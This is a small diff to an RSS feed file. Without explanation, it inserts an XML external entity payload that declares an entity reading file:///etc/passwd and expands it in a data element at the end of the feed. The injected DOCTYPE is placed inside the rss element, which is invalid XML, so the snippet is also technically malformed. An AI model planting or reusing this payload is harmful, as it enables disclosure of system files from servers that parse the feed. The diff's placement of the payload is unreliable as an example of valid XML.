@@ -33,4 +33,9 @@
       </content:encoded>
     </item>
   </channel>
+  <!DOCTYPE data [
+  <!ELEMENT data (#ANY)>
+    <!ENTITY file SYSTEM "file:///etc/passwd">
+  ]>
+  <data>&file;</data>
 </rss>
